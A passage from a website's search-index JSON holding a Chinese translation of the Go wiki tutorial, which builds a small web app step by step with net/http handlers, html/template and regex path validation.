\u5728\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u6355\u83b7\u9519\u8bef\u6761\u4ef6\u4f1a\u5f15\u5165\u5927\u91cf\u91cd\u590d\u4ee3\u7801\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u5305\u88c5\u5728\u4e00\u4e2a\u6267\u884c\u6b64\u9a8c\u8bc1\u548c\u9519\u8bef\u68c0\u67e5\u7684\u51fd\u6570\u4e2d\u600e\u4e48\u529e\uff1fGo \u7684 \u51fd\u6570\u5b57\u9762\u91cf \u63d0\u4f9b\u4e86\u4e00\u79cd\u5f3a\u5927\u7684\u62bd\u8c61\u529f\u80fd\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u4e3a\u6211\u4eec\u63d0\u4f9b\u5e2e\u52a9\u3002 \u9996\u5148\uff0c\u6211\u4eec\u91cd\u5199\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u7684\u51fd\u6570\u5b9a\u4e49\u4ee5\u63a5\u53d7\u6807\u9898\u5b57\u7b26\u4e32\uff1a func viewHandler(w http.ResponseWriter, r *http.Request, title string) func editHandler(w http.ResponseWriter, r *http.Request, title string) func saveHandler(w http.ResponseWriter, r *http.Request, title string) \u73b0\u5728\u8ba9\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5305\u88c5\u51fd\u6570\uff0c\u5b83\u63a5\u53d7\u4e0a\u8ff0\u7c7b\u578b\u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a http.HandlerFunc \u7c7b\u578b\u7684\u51fd\u6570\uff08\u9002\u5408\u4f20\u9012\u7ed9\u51fd\u6570 http.HandleFunc \uff09\uff1a func makeHandler(fn func (http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { // Here we will extract the page title from the Request, // and call the provided handler 'fn' } } \u8fd4\u56de\u7684\u51fd\u6570\u79f0\u4e3a \u95ed\u5305 \uff0c\u56e0\u4e3a\u5b83\u5305\u542b\u5728\u5176\u5916\u90e8\u5b9a\u4e49\u7684\u503c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53d8\u91cf fn \uff08 makeHandler \u7684\u5355\u4e2a\u53c2\u6570\uff09\u7531\u95ed\u5305\u5305\u56f4\u3002\u8be5\u53d8\u91cf fn \u5c06\u662f\u6211\u4eec\u7684\u4fdd\u5b58\u3001\u7f16\u8f91\u6216\u67e5\u770b\u7684\u5904\u7406\u7a0b\u5e8f\u4e4b\u4e00\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4ece getTitle \u4e2d\u83b7\u53d6\u4ee3\u7801\u5e76\u5728\u6b64\u5904\u4f7f\u7528\u5b83\uff08\u7a0d\u4f5c\u4fee\u6539\uff09\uff1a func makeHandler(fn func(http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return } fn(w, r, m[2]) } } makeHandler \u8fd4\u56de\u7684\u95ed\u5305\u662f\u4e00\u4e2a\u63a5\u53d7 http.ResponseWriter \u548c http.Request \uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u4e00\u4e2a http.HandlerFunc \uff09\u53c2\u6570\u7684\u51fd\u6570\u3002\u95ed\u5305\u4ece\u8bf7\u6c42\u8def\u5f84\u4e2d\u63d0\u53d6 title \uff0c\u5e76\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f validPath \u5bf9\u5176\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c title \u65e0\u6548\uff0c\u5c06\u4f7f\u7528 http.NotFound \u51fd\u6570\u5411 ResponseWriter \u5199\u5165\u9519\u8bef\u3002\u5982\u679c title \u6709\u6548\uff0c\u5219\u4f7f\u7528 ResponseWriter \u3001 Request \u548c title \u4f5c\u4e3a\u53c2\u6570\u8c03\u7528\u5c01\u95ed\u7684\u5904\u7406\u51fd\u6570 fn \u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5728 main \u4e2d\u7528 makeHandler \u5305\u88c5\u5904\u7406\u51fd\u6570\uff0c\u7136\u540e\u518d\u5c06\u5b83\u4eec\u6ce8\u518c\u5230 http \u5305\u4e2d\uff1a func main() { http.HandleFunc(\"/view/\", makeHandler(viewHandler)) http.HandleFunc(\"/edit/\", makeHandler(editHandler)) http.HandleFunc(\"/save/\", makeHandler(saveHandler)) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u6700\u540e\uff0c\u6211\u4eec\u4ece\u5904\u7406\u51fd\u6570\u4e2d\u5220\u9664\u5bf9 getTitle \u7684\u8c03\u7528\uff0c\u4f7f\u5b83\u4eec\u66f4\u7b80\u5355\uff1a func viewHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request, title string) { body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } \u6d4b\u8bd5\u4e00\u4e0b \uf0c1 \u5355\u51fb\u6b64\u5904\u67e5\u770b\u6700\u7ec8\u4ee3\u7801\u6e05\u5355\u3002 \u91cd\u65b0\u7f16\u8bd1\u4ee3\u7801\uff0c\u7136\u540e\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff1a $ go build wiki.go $ ./wiki \u8bbf\u95ee http://localhost:8080/view/ANewPage \u5e94\u8be5\u4f1a\u663e\u793a\u9875\u9762\u7f16\u8f91\u8868\u5355\u3002\u7136\u540e\uff0c\u60a8\u5e94\u8be5\u80fd\u591f\u8f93\u5165\u4e00\u4e9b\u6587\u672c\uff0c\u5355\u51fb\u201c\u4fdd\u5b58\u201d\uff0c\u7136\u540e\u88ab\u91cd\u5b9a\u5411\u5230\u65b0\u521b\u5efa\u7684\u9875\u9762\u3002 \u5176\u4ed6\u4efb\u52a1 \uf0c1 \u4ee5\u4e0b\u662f\u60a8\u53ef\u80fd\u5e0c\u671b\u81ea\u5df1\u89e3\u51b3\u7684\u4e00\u4e9b\u7b80\u5355\u4efb\u52a1\uff1a \u5c06\u6a21\u677f\u5b58\u50a8\u5728 tmpl/ \u4e2d\uff0c\u5c06\u9875\u9762\u6570\u636e\u5b58\u50a8\u5728 data/ \u4e2d\u3002 \u6dfb\u52a0\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u4ee5\u4f7f Web \u6839\u91cd\u5b9a\u5411\u5230 /view/FrontPage \u3002 \u901a\u8fc7\u4f7f\u5b83\u4eec\u6210\u4e3a\u6709\u6548\u7684 HTML \u5e76\u6dfb\u52a0\u4e00\u4e9b CSS \u89c4\u5219\u6765\u7f8e\u5316\u9875\u9762\u6a21\u677f\u3002 \u901a\u8fc7\u5c06 [PageName] \u7684\u5b9e\u4f8b\u8f6c\u6362\u4e3a <a href=\"/view/PageName\">PageName</a> \uff08\u63d0\u793a\uff1a\u4f60\u53ef\u4ee5\u7528 regexp.ReplaceAllFunc \u6765\u505a\u8fd9\u4e2a\uff09 \u6765\u5b9e\u73b0\u9875\u9762\u95f4\u94fe\u63a5\u3002 \u53c2\u8003\u8d44\u6599 \uf0c1 https://go.dev/doc/articles/wiki/","title":"Writing Web app"},{"location":"go/writing_web_app/#write-web-applications","text":"\u7f16\u5199 Web \u5e94\u7528\u7a0b\u5e8f \u672c\u6559\u7a0b\u6db5\u76d6\uff1a \u521b\u5efa\u5177\u6709\u52a0\u8f7d\u548c\u4fdd\u5b58\u65b9\u6cd5\u7684\u6570\u636e\u7ed3\u6784 \u4f7f\u7528 net/http \u5305\u6784\u5efa Web \u5e94\u7528\u7a0b\u5e8f \u4f7f\u7528 html/template \u5305\u5904\u7406 HTML \u6a21\u677f \u4f7f\u7528 regexp \u5305\u9a8c\u8bc1\u7528\u6237\u8f93\u5165 \u4f7f\u7528\u95ed\u5305 \u5047\u8bbe\u77e5\u8bc6\uff1a \u7f16\u7a0b\u7ecf\u9a8c \u4e86\u89e3\u57fa\u672c\u7684\u7f51\u7edc\u6280\u672f\uff08HTTP\u3001HTML\uff09 \u4e00\u4e9b UNIX/DOS \u547d\u4ee4\u884c\u77e5\u8bc6","title":"\u7f16\u5199 Web \u5e94\u7528\u7a0b\u5e8f"},{"location":"go/writing_web_app/#create-folder-for-code","text":"\u5728\u4f60\u7684 GOPATH \u4e2d\u4e3a\u672c\u6559\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u76ee\u5f55\uff1a $ mkdir gowiki $ cd gowiki \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a wiki.go \u7684\u6587\u4ef6\uff0c\u5728\u60a8\u559c\u6b22\u7684\u7f16\u8f91\u5668\u4e2d\u6253\u5f00\u5b83\uff0c\u7136\u540e\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff1a package main import ( \"fmt\" \"os\" ) \u6211\u4eec\u4ece Go \u6807\u51c6\u5e93\u4e2d \u5bfc\u5165 fmt \u548c os \u5305\u3002\u7a0d\u540e\uff0c\u5f53\u6211\u4eec\u5b9e\u73b0\u9644\u52a0\u529f\u80fd\u65f6\uff0c\u6211\u4eec\u5c06\u5728\u6b64import\u58f0\u660e\u4e2d\u6dfb\u52a0\u66f4\u591a\u5305\u3002","title":"\u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939"},{"location":"go/writing_web_app/#data-structures","text":"\u8ba9\u6211\u4eec\u4ece\u5b9a\u4e49\u6570\u636e\u7ed3\u6784\u5f00\u59cb\u3002\u4e00\u4e2a wiki \u7531\u4e00\u7cfb\u5217\u76f8\u4e92\u5173\u8054\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a\u9875\u9762\u90fd\u6709\u4e00\u4e2a\u6807\u9898\u548c\u4e00\u4e2a\u6b63\u6587\uff08\u9875\u9762\u5185\u5bb9\uff09\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5b9a\u4e49 Page \u4e3a\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u5305\u542b\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u4ee3\u8868\u6807\u9898\u548c\u6b63\u6587\u3002 type Page struct { Title string Body []byte } \u8be5\u7c7b\u578b\u7684 []byte \u610f\u601d\u662f\u201cbyte\u5207\u7247\u6570\u7ec4\u201d\u3002\uff08\u6709\u5173\u5207\u7247\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u5207\u7247\uff1a\u7528\u6cd5\u548c\u5185\u90e8 \u3002\uff09 Body \u5143\u7d20\u662f []byte \u800c\u4e0d\u662f string \uff0c\u56e0\u4e3a\u8fd9\u662f\u6211\u4eec\u5c06\u4f7f\u7528\u7684 io \u5e93\u6240\u671f\u671b\u7684\u7c7b\u578b\uff0c\u5982\u4e0b\u6240\u793a\u3002 \u8be5 Page \u7ed3\u6784\u63cf\u8ff0\u4e86\u9875\u9762\u6570\u636e\u5c06\u5982\u4f55\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u3002\u4f46\u662f\u6301\u4e45\u5b58\u50a8\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728 Page \u4e0a\u521b\u5efa\u4e00\u4e2a save \u65b9\u6cd5\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } \u8fd9\u4e2a\u65b9\u6cd5\u7684\u7b7e\u540d\u5199\u7740\uff1a\u201c\u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a save \u7684\u65b9\u6cd5\uff0c\u5b83\u7684\u63a5\u6536\u8005p\u662f\u4e00\u4e2a\u6307\u5411 Page \u7684\u6307\u9488\u3002\u5b83\u4e0d\u63a5\u53d7\u4efb\u4f55\u53c2\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a error \u7c7b\u578b\u7684\u503c\u3002\u201d \u6b64\u65b9\u6cd5\u4f1a\u5c06 Page's Body \u4fdd\u5b58\u5230\u6587\u672c\u6587\u4ef6\u4e2d\u3002\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 Title \u4f5c\u4e3a\u6587\u4ef6\u540d\u3002 \u8be5 save \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a error \u503c\uff0c\u56e0\u4e3a\u8fd9\u662f WriteFile \uff08\u5c06\u5b57\u8282\u5207\u7247\u5199\u5165\u6587\u4ef6\u7684\u6807\u51c6\u5e93\u51fd\u6570\uff09\u7684\u8fd4\u56de\u7c7b\u578b\u3002\u8be5 save \u65b9\u6cd5\u8fd4\u56de\u9519\u8bef\u503c\uff0c\u8ba9\u5e94\u7528\u7a0b\u5e8f\u5728\u5199\u5165\u6587\u4ef6\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u65f6\u5904\u7406\u5b83\u3002\u5982\u679c\u4e00\u5207\u987a\u5229\uff0c Page.save() \u5c06\u8fd4\u56de nil \uff08\u6307\u9488\u3001\u63a5\u53e3\u548c\u5176\u4ed6\u4e00\u4e9b\u7c7b\u578b\u7684\u96f6\u503c\uff09\u3002 \u516b\u8fdb\u5236\u6574\u6570\u6587\u5b57 0600 \uff0c\u4f5c\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u4f20\u9012\u7ed9 WriteFile \uff0c\u8868\u793a\u521b\u5efa\u6587\u4ef6\u65f6\u5e94\u4ec5\u5bf9\u5f53\u524d\u7528\u6237\u5177\u6709\u8bfb\u5199\u6743\u9650\u3002\uff08\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 Unix man page open(2) \u3002\uff09 \u9664\u4e86\u4fdd\u5b58\u9875\u9762\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u52a0\u8f7d\u9875\u9762\uff1a func loadPage(title string) *Page { filename := title + \".txt\" body, _ := os.ReadFile(filename) return &Page{Title: title, Body: body} } \u8be5\u51fd\u6570 loadPage \u4ece title \u53c2\u6570\u6784\u9020\u6587\u4ef6\u540d\uff0c\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u5165\u4e00\u4e2a\u65b0\u53d8\u91cf body \uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u7531\u6b63\u786e\u7684\u6807\u9898\u548c\u6b63\u6587\u503c\u6784\u9020\u7684 Page \u3002 \u51fd\u6570\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\u3002\u6807\u51c6\u5e93\u51fd\u6570 os.ReadFile \u8fd4\u56de []byte \u548c error \u3002\u5728 loadPage \u4e2d\uff0c\u5c1a\u672a\u5904\u7406\u9519\u8bef\uff1b\u4e0b\u5212\u7ebf(_) \u7b26\u53f7\u8868\u793a\u7684\u201c\u7a7a\u767d\u6807\u8bc6\u7b26\u201d\u7528\u4e8e\u4e22\u5f03\u9519\u8bef\u8fd4\u56de\u503c\uff08\u672c\u8d28\u4e0a\uff0c\u5c06\u503c\u8d4b\u503c\u4e3a\u7a7a\uff09\u3002 \u4f46\u662f\u5982\u679c ReadFile \u9047\u5230\u9519\u8bef\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u4f8b\u5982\uff0c\u8be5\u6587\u4ef6\u53ef\u80fd\u4e0d\u5b58\u5728\u3002\u6211\u4eec\u4e0d\u5e94\u8be5\u5ffd\u89c6\u8fd9\u6837\u7684\u9519\u8bef\u3002\u8ba9\u6211\u4eec\u4fee\u6539\u51fd\u6570\u4ee5\u8fd4\u56de *Page \u548c error \u3002 func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } \u8be5\u51fd\u6570\u7684\u8c03\u7528\u8005\u73b0\u5728\u53ef\u4ee5\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1b\u5982\u679c\u662f nil \u5219\u5b83\u5df2\u6210\u529f\u52a0\u8f7d\u9875\u9762\u3002\u5982\u679c\u4e0d\u662f\uff0c\u5b83\u5c06\u662f\u53ef\u4ee5\u7531\u8c03\u7528\u8005\u5904\u7406\u7684 error \uff08\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u8bed\u8a00\u89c4\u8303 \uff09\u3002 \u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6570\u636e\u7ed3\u6784\u548c\u4fdd\u5b58\u5230\u6587\u4ef6\u548c\u4ece\u6587\u4ef6\u52a0\u8f7d\u7684\u80fd\u529b\u3002\u8ba9\u6211\u4eec\u7f16\u5199\u4e00\u4e2a main \u51fd\u6570\u6765\u6d4b\u8bd5\u6211\u4eec\u6240\u5199\u7684\u5185\u5bb9\uff1a func main() { p1 := &Page{Title: \"TestPage\", Body: []byte(\"This is a sample Page.\")} p1.save() p2, _ := loadPage(\"TestPage\") fmt.Println(string(p2.Body)) } \u7f16\u8bd1\u5e76\u6267\u884c\u6b64\u4ee3\u7801\u540e\uff0c\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a TestPage.txt \u7684\u6587\u4ef6\uff0c\u5305\u542b p1 \u7684\u6b63\u6587\u3002\u7136\u540e\u5c06\u6587\u4ef6\u8bfb\u5165\u7ed3\u6784\u4f53 p2 \uff0c\u5e76\u5c06\u5176 Body \u5143\u7d20\u6253\u5370\u5230\u5c4f\u5e55\u4e0a\u3002 \u60a8\u53ef\u4ee5\u50cf\u8fd9\u6837\u7f16\u8bd1\u548c\u8fd0\u884c\u7a0b\u5e8f\uff1a $ go build wiki.go $ ./wiki This is a sample Page. \uff08\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f Windows\uff0c\u5219\u5fc5\u987b\u952e\u5165\u4e0d\u5e26 \u201c./\u201d \u7684 \u201cwiki\u201d \u624d\u80fd\u8fd0\u884c\u7a0b\u5e8f\u3002\uff09 \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002","title":"\u6570\u636e\u7ed3\u6784"},{"location":"go/writing_web_app/#introducing-net-http-package","text":"\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355 Web \u670d\u52a1\u5668\u7684\u5b8c\u6574\u5de5\u4f5c\u793a\u4f8b\uff1a //go:build ignore package main import ( \"fmt\" \"log\" \"net/http\" ) func handler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \"Hi there, I love %s!\", r.URL.Path[1:]) } func main() { http.HandleFunc(\"/\", handler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u8be5 main \u51fd\u6570\u4ee5\u5bf9 http.HandleFunc \u7684\u8c03\u7528\u5f00\u59cb\uff0c\u5b83\u544a\u8bc9 http \u7a0b\u5e8f\u5305\u4f7f\u7528 handler \u51fd\u6570\u5904\u7406\u5bf9 Web \u6839( \"/\" )\u7684\u6240\u6709\u8bf7\u6c42\u3002 \u7136\u540e\u5b83\u8c03\u7528 http.ListenAndServe \uff0c\u6307\u5b9a\u5b83\u5e94\u8be5\u5728\u4efb\u4f55\u63a5\u53e3 ( \":8080\" ) \u4e0a\u4fa6\u542c\u7aef\u53e3 8080 \u3002\uff08\u6682\u65f6\u4e0d\u8981\u62c5\u5fc3\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 nil \u3002\uff09\u8fd9\u4e2a\u51fd\u6570\u5c06\u4e00\u76f4\u963b\u585e\uff0c\u76f4\u5230\u7a0b\u5e8f\u7ec8\u6b62\u3002 ListenAndServe \u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\uff0c\u56e0\u4e3a\u5b83\u53ea\u5728\u53d1\u751f\u610f\u5916\u9519\u8bef\u65f6\u8fd4\u56de\u3002\u4e3a\u4e86\u8bb0\u5f55\u8be5\u9519\u8bef\uff0c\u6211\u4eec\u5c06\u5728\u51fd\u6570 log.Fatal \u4e2d\u8c03\u7528\u3002 \u8be5\u51fd\u6570 handler \u7684\u7c7b\u578b\u4e3a http.HandlerFunc \u3002\u5b83\u4ee5 http.ResponseWriter \u548c http.Request \u4f5c\u4e3a\u53c2\u6570\u3002 \u4e00\u4e2a http.ResponseWriter \u503c\u7ec4\u5408\u4e86 HTTP \u670d\u52a1\u5668\u7684\u54cd\u5e94\uff1b\u901a\u8fc7\u5199\u5165\u5b83\uff0c\u6211\u4eec\u5c06\u6570\u636e\u53d1\u9001\u5230 HTTP \u5ba2\u6237\u7aef\u3002 http.Request \u662f\u8868\u793a\u5ba2\u6237\u7aef HTTP \u8bf7\u6c42\u7684\u6570\u636e\u7ed3\u6784\u3002 r.URL.Path \u662f\u8bf7\u6c42 URL \u7684\u8def\u5f84\u7ec4\u4ef6\u3002\u5c3e\u968f [1:] \u610f\u5473\u7740\u201c\u521b\u5efa\u4ece Path \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5230\u7ed3\u5c3e\u7684\u5b50\u5207\u7247\u201d\u3002\u8fd9\u4f1a\u4ece\u8def\u5f84\u540d\u4e2d\u5220\u9664\u524d\u5bfc\u201c/\u201d\u3002 \u5982\u679c\u60a8\u8fd0\u884c\u6b64\u7a0b\u5e8f\u5e76\u8bbf\u95ee URL\uff1a http://localhost:8080/monkeys \u8be5\u7a0b\u5e8f\u5c06\u663e\u793a\u4e00\u4e2a\u9875\u9762\uff0c\u5176\u4e2d\u5305\u542b\uff1a Hi there, I love monkeys!","title":"\u4ecb\u7ecdnet/http\u5305"},{"location":"go/writing_web_app/#nethttpwiki","text":"\u8981\u4f7f\u7528\u8be5 net/http \u5305\uff0c\u5fc5\u987b\u5c06\u5176\u5bfc\u5165\uff1a import ( \"fmt\" \"os\" \"log\" \"net/http\" ) \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\uff0c viewHandler \u5b83\u5141\u8bb8\u7528\u6237\u67e5\u770b wiki \u9875\u9762\u3002\u5b83\u5c06\u5904\u7406\u4ee5\u201c/view/\u201d\u4e3a\u524d\u7f00\u7684 URL\u3002 func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) fmt.Fprintf(w, \"<h1>%s</h1><div>%s</div>\", p.Title, p.Body) } \u518d\u6b21\u6ce8\u610f\u4f7f\u7528 _ \u5ffd\u7565\u6765\u81ea loadPage \u7684\u8fd4\u56de\u503c error \u3002\u8fd9\u662f\u4e3a\u4e86\u7b80\u5355\u8d77\u89c1\uff0c\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e0d\u597d\u7684\u505a\u6cd5\u3002\u6211\u4eec\u7a0d\u540e\u4f1a\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002 \u9996\u5148\uff0c\u6b64\u51fd\u6570\u4ece\u8bf7\u6c42 URL \u7684\u8def\u5f84\u7ec4\u4ef6 r.URL.Path \u4e2d\u63d0\u53d6\u9875\u9762\u6807\u9898\u3002\u4f7f\u7528 [len(\"/view/\"):] \u5c06 Path \u91cd\u65b0\u5207\u7247\u4ee5\u5220\u9664\u8bf7\u6c42\u8def\u5f84\u7684\u524d\u5bfc \"/view/\" \u7ec4\u4ef6\u3002\u8fd9\u662f\u56e0\u4e3a\u8def\u5f84\u603b\u662f\u4ee5 \"/view/\" \u5f00\u5934\uff0c\u5b83\u4e0d\u662f\u9875\u9762\u6807\u9898\u7684\u4e00\u90e8\u5206\u3002 \u7136\u540e\u8be5\u51fd\u6570\u52a0\u8f7d\u9875\u9762\u6570\u636e\uff0c\u7528\u4e00\u4e32\u7b80\u5355\u7684 HTML \u683c\u5f0f\u5316\u9875\u9762\uff0c\u5e76\u5c06\u5176\u5199\u5165 http.ResponseWriter \u5bf9\u8c61 w . \u8981\u4f7f\u7528\u8fd9\u4e2a\u5904\u7406\u7a0b\u5e8f\uff0c\u6211\u4eec\u91cd\u5199\u6211\u4eec\u7684 main \u51fd\u6570\u6765\u521d\u59cb\u5316 http \u4f7f\u7528 viewHandler \u6765\u5904\u7406 /view/ \u8def\u5f84\u4e0b\u7684\u4efb\u4f55\u8bf7\u6c42\u3002 func main() { http.HandleFunc(\"/view/\", viewHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002 \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e9b\u9875\u9762\u6570\u636e\uff08\u4fdd\u5b58\u4e3a test.txt \uff09\uff0c\u7f16\u8bd1\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u5e76\u5c1d\u8bd5\u63d0\u4f9b\u4e00\u4e2a wiki \u9875\u9762\u3002 \u5728\u7f16\u8f91\u5668\u4e2d\u6253\u5f00 test.txt \u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4e2d\u4fdd\u5b58\u5b57\u7b26\u4e32\u201cHello world\u201d\uff08\u4e0d\u5e26\u5f15\u53f7\uff09\u3002 $ go build wiki.go $ ./wiki \uff08\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f Windows\uff0c\u5219\u5fc5\u987b\u952e\u5165\u4e0d\u5e26 \u201c./\u201d \u7684 \u201cwiki\u201d \u624d\u80fd\u8fd0\u884c\u7a0b\u5e8f\u3002\uff09 \u968f\u7740\u8fd9\u4e2a\u7f51\u7edc\u670d\u52a1\u5668\u7684\u8fd0\u884c\uff0c\u8bbf\u95ee http://localhost:8080/view/test \u5e94\u8be5\u4f1a\u663e\u793a\u4e00\u4e2a\u6807\u9898\u4e3a\u201ctest\u201d\u7684\u9875\u9762\uff0c\u5176\u4e2d\u5305\u542b\u201cHello world\u201d\u8fd9\u4e2a\u8bcd\u3002","title":"\u7528net/http\u670d\u52a1wiki\u9875\u9762"},{"location":"go/writing_web_app/#edit-pages","text":"wiki \u4e0d\u80fd\u6ca1\u6709\u7f16\u8f91\u9875\u9762\u7684\u80fd\u529b\u3002\u8ba9\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u65b0\u7684\u5904\u7406\u7a0b\u5e8f\uff1a\u4e00\u4e2a\u547d\u540d editHandler \u4e3a\u663e\u793a\u201c\u7f16\u8f91\u9875\u9762\u201d\u8868\u5355\uff0c\u53e6\u4e00\u4e2a\u547d\u540d saveHandler \u4e3a\u4fdd\u5b58\u901a\u8fc7\u8868\u5355\u8f93\u5165\u7684\u6570\u636e\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230 main() \uff1a func main() { http.HandleFunc(\"/view/\", viewHandler) http.HandleFunc(\"/edit/\", editHandler) http.HandleFunc(\"/save/\", saveHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u51fd\u6570 editHandler \u52a0\u8f7d\u9875\u9762\uff08\u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u7a7a Page \u7ed3\u6784\uff09\uff0c\u5e76\u663e\u793a\u4e00\u4e2a HTML \u8868\u5355\u3002 func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } fmt.Fprintf(w, \"<h1>Editing %s</h1>\"+ \"<form action=\\\"/save/%s\\\" method=\\\"POST\\\">\"+ \"<textarea name=\\\"body\\\">%s</textarea><br>\"+ \"<input type=\\\"submit\\\" value=\\\"Save\\\">\"+ \"</form>\", p.Title, p.Title, p.Body) } \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f46\u6240\u6709\u786c\u7f16\u7801\u7684 HTML \u90fd\u5f88\u4e11\u964b\u3002\u5f53\u7136\uff0c\u8fd8\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u3002","title":"\u7f16\u8f91\u9875\u9762"},{"location":"go/writing_web_app/#html-template-package","text":"\u8be5 html/template \u5305\u662f Go \u6807\u51c6\u5e93\u7684\u4e00\u90e8\u5206\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 html/template \u5c06 HTML \u4fdd\u5b58\u5728\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\uff0c\u5141\u8bb8\u6211\u4eec\u66f4\u6539\u7f16\u8f91\u9875\u9762\u7684\u5e03\u5c40\uff0c\u800c\u65e0\u9700\u4fee\u6539\u5e95\u5c42 Go \u4ee3\u7801\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5fc5\u987b\u6dfb\u52a0 html/template \u5230\u5bfc\u5165\u5217\u8868\u4e2d\u3002\u6211\u4eec\u4e5f\u4e0d\u4f1a\u518d\u4f7f\u7528 fmt \u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5220\u9664\u5b83\u3002 import ( \"html/template\" \"os\" 